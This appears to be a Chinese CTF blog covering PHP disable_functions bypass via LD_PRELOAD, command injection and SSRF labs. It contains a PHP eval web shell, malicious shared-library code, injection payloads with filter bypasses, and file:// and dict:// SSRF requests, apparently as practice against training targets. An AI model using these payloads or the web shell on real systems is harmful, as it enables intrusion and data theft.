<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ant&#x27;</span>]);</span><br><span class="line">  putenv(<span class="string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>); <span class="comment">//将LD_PRELOAD设置为hack.so，而hack.so为hack.c编译出的文件</span></span><br><span class="line">  error_log(<span class="string">&quot;admin&quot;</span>,<span class="number">1</span>);</span><br><span class="line">  mail(<span class="string">&quot;admin@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>); <span class="comment">//发送email时需要用到geteuid库函数，在hack.so中将其覆盖重写</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;cat /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;tac /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;more /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;head -2 /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;tail /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123; <span class="comment">// 覆盖重写geteuid，使得能够执行payload函数</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>hack.so</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc -shared hack -o hack.so</span><br></pre></td></tr></table></figure>
<p>在linux下编译后，上传到/tmp（或者其他指定目录，与shell.php中指定目录相同）</p>
<p>访问shell.php后，在访问test.php，即可得到flag</p>
<h3 id="LD-PRELOAD的绕过"><a href="#LD-PRELOAD的绕过" class="headerlink" title="LD_PRELOAD的绕过"></a>LD_PRELOAD的绕过</h3><p><span id=“LD_PRELOAD“>跳转到的地方</span></p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/106330120">https://blog.csdn.net/qq_38154820/article/details/106330120</a><br>条件：</p>
<pre><code>1. 能够上传自己的.so
 2. 能够控制环境变量的值，如使用putenv函数
 3. 存在启动PHP启动外部程序的函数，并能执行。如mail()，imap_mail()，mb_send_mail()，error_log()</code></pre>
<p>查看系统函数会调用那些库函数：<br>    如查看sendmail</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws &#x2F;usr&#x2F;sbin&#x2F;sendmail</span><br></pre></td></tr></table></figure>
<p>在c文件中覆盖调用的库函数，编译为.so文件（如要覆盖geteuid()）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;cat /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;tac /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;more /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;head -2 /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;tail /flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123; <span class="comment">// 覆盖重写geteuid，使得能够执行payload函数</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC test.c -o test_x64.so</span><br></pre></td></tr></table></figure>


<p>更通用的写法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__((constructor))<span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmd = getenv(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;CMD=ls&quot;</span>);</span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=./test3_x64.so&quot;</span>);</span><br><span class="line">error_log(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((constructor))</span><br><span class="line">constructor参数让系统执行main()函数之前调用函数(被__attribute__((constructor))修饰的函数)</span><br><span class="line">__attribute__((destructor))</span><br><span class="line">destructor参数让系统在main()函数退出或者调用了exit()之后,(被__attribute__((destructor))修饰的函数)</span><br></pre></td></tr></table></figure>
<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><h2 id="绕过disable-function"><a href="#绕过disable-function" class="headerlink" title="绕过disable_function"></a>绕过disable_function</h2><h3 id="LD-PRELOAD-1"><a href="#LD-PRELOAD-1" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>​    见CTFHub LD_PRELOAD的绕过 <a href="#LD_PRELOAD">点击跳转</a></p>
<h2 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/26/CTF-Web-php/" data-id="ckloj8nvt0002vcus91ox1afh" data-title="CTF-Web-php" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/24/CTF-Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
  <time class="dt-published" datetime="2021-02-24T13:42:40.000Z" itemprop="datePublished">2021-02-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/24/CTF-Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">CTF-Web-命令执行</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; dir ..</span><br></pre></td></tr></table></figure>
<p>注意，目标主机为windows主机，故只能用windows命令行的命令</p>
<h2 id="median"><a href="#median" class="headerlink" title="median"></a>median</h2><p>看源码，设置了黑名单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$substitutions &#x3D; array(</span><br><span class="line">    &#39;&amp;&amp;&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上一个payload仍可以继续使用</p>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>设置了黑名单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$substitutions &#x3D; array(</span><br><span class="line">    &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>payload1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ipconfig</span><br></pre></td></tr></table></figure>
<p>原理：黑名单的|右边有空格</p>
<h1 id="LFI-labs"><a href="#LFI-labs" class="headerlink" title="LFI labs"></a>LFI labs</h1><h2 id="CMD-1"><a href="#CMD-1" class="headerlink" title="CMD-1"></a>CMD-1</h2><p>注意要手动修改一下URL地址，因为默认访问地址为<a target="_blank" rel="noopener" href="http://192.168.64.2/CMD-1/index.php?cmd=ipconfig">http://192.168.64.2/CMD-1/index.php?cmd=ipconfig</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-1&#x2F;index.php?cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure>
<h2 id="CMD-2"><a href="#CMD-2" class="headerlink" title="CMD-2"></a>CMD-2</h2><p>post提交cmd变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL: http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-2&#x2F;index.php</span><br><span class="line">post data: cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure>
<h2 id="CMD-3"><a href="#CMD-3" class="headerlink" title="CMD-3"></a>CMD-3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-3&#x2F;index.php?domain&#x3D;www.baidu.com;whoami</span><br></pre></td></tr></table></figure>
<p>源码中显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">	echo(&quot;domain&#x3D;&quot; . $_GET[&quot;domain&quot;]);</span><br><span class="line">    system(&quot;&#x2F;usr&#x2F;bin&#x2F;whois &quot; . $_GET[&quot;domain&quot;]);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<p>这是一个linux下的执行命令，故windows下不会执行</p>
<p>正常的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-3&#x2F;index.php?domain&#x3D;www.baidu.com;whoami</span><br></pre></td></tr></table></figure>
<h2 id="CMD-4"><a href="#CMD-4" class="headerlink" title="CMD-4"></a>CMD-4</h2><p>CMD-3的post版</p>
<h2 id="CMD-5"><a href="#CMD-5" class="headerlink" title="CMD-5"></a>CMD-5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;CMD-5&#x2F;index.php?server&#x3D;127.0.0.1|ipconfig;&amp;domain&#x3D;facebook.com</span><br></pre></td></tr></table></figure>
<h2 id="CMD-6"><a href="#CMD-6" class="headerlink" title="CMD-6"></a>CMD-6</h2><p>CMD-5的post版</p>
<h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p>_request就是get的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-83e7247d4e39e832.sandbox.ctfhub.com:10080&#x2F;index.php?cmd&#x3D;system(&#39;ls&#39;);</span><br><span class="line">index.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challenge-83e7247d4e39e832.sandbox.ctfhub.com:10080&#x2F;index.php?cmd&#x3D;system(&#39;ls ..&#x2F;..&#x2F;..&#39;);</span><br><span class="line">bin boot dev etc flag_31072 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challenge-83e7247d4e39e832.sandbox.ctfhub.com:10080&#x2F;index.php?cmd&#x3D;system(&#39;cat ..&#x2F;..&#x2F;..&#x2F;flag_31072&#39;);</span><br><span class="line">ctfhub&#123;6666fe7dd3da831df9f68f80&#125; </span><br></pre></td></tr></table></figure>
<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1| cat 321451934626212.php</span><br><span class="line">直接打开，无法打开，说明有特殊字符</span><br><span class="line"></span><br><span class="line">?ip&#x3D;127.0.0.1| cat 321451934626212.php | base64</span><br><span class="line"></span><br><span class="line">PD9waHAgLy8gY3RmaHViezAxNTYwYjNmMDEzOGRkYWE2M2E4NGJjNX0K</span><br><span class="line">&lt;?php &#x2F;&#x2F; ctfhub&#123;01560b3f0138ddaa63a84bc5&#125;</span><br></pre></td></tr></table></figure>
<h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1 | tac flag_321901637828076.php | base64</span><br></pre></td></tr></table></figure>
<h3 id="linux下查看文件内容的命令"><a href="#linux下查看文件内容的命令" class="headerlink" title="linux下查看文件内容的命令"></a>linux下查看文件内容的命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">head</span><br><span class="line">tail</span><br><span class="line">more</span><br><span class="line">tac</span><br><span class="line">cat</span><br><span class="line">nl</span><br><span class="line">od</span><br></pre></td></tr></table></figure>
<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>注意这些在输入框中提交，而不是在URL中提交（会有不可知的编码问题）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat$&#123;IFS&#125;flag*|base64</span><br><span class="line">127.0.0.1&amp;cat&lt;flag*|base64</span><br></pre></td></tr></table></figure>
<h3 id="linux下空格过滤绕过"><a href="#linux下空格过滤绕过" class="headerlink" title="linux下空格过滤绕过"></a>linux下空格过滤绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, $&#123;IFS&#125;,$IFS </span><br></pre></td></tr></table></figure>
<p>linux下${IFS}是分隔符的意思，默认是空格、制表符、换行符</p>
<h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p>还是注意要在输入框提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; cd flag_is_here;cat flag_65852541225548.php|base64</span><br></pre></td></tr></table></figure>
<h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;base64 flag_1744997223232.php</span><br></pre></td></tr></table></figure>
<h2 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0abase64$&#123;IFS&#125;f**g_170978829515.php</span><br></pre></td></tr></table></figure>
<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>来源： GXYCTF2019</p>
<p>考察：RCE，空格绕过</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12246386.html">https://www.cnblogs.com/wangtanzhi/p/12246386.html</a></p>
<p>页面提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;</span><br></pre></td></tr></table></figure>
<p>故在URL处设置ip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure>
<p>有回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1|ls</span><br><span class="line">?ip&#x3D;127.0.0.1|cat flag.php </span><br><span class="line">?ip&#x3D;127.0.0.1|flag.php</span><br></pre></td></tr></table></figure>
<p>有过滤</p>
<p>fuzz一下，发现{}这些都被过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>故不能直接输入flag</p>
<p>payload1：设置变量法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.ph</span><br></pre></td></tr></table></figure>
<p>payload2：base64编码法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
<h2 id="PHP下空格检测绕过"><a href="#PHP下空格检测绕过" class="headerlink" title="PHP下空格检测绕过"></a>PHP下空格检测绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/24/CTF-Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="ckloj8nvr0001vcusb64ga86k" data-title="CTF-Web-命令执行" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/20/CTF-Web-SSRF/" class="article-date">
  <time class="dt-published" datetime="2021-02-20T01:26:15.000Z" itemprop="datePublished">2021-02-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/20/CTF-Web-SSRF/">CTF-Web-SSRF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTFHub（没做完，有几题貌似环境有问题）"><a href="#CTFHub（没做完，有几题貌似环境有问题）" class="headerlink" title="CTFHub（没做完，有几题貌似环境有问题）"></a>CTFHub（没做完，有几题貌似环境有问题）</h1><h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<p>在注释中可以看到flag</p>
<p>注意，此处file协议后跟的绝对路径</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>考察：dict://协议</p>
<p>dict://协议可用于探测开放的端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:§_§ HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>得到端口后，直接访问（此处得到8011）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1:8011</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
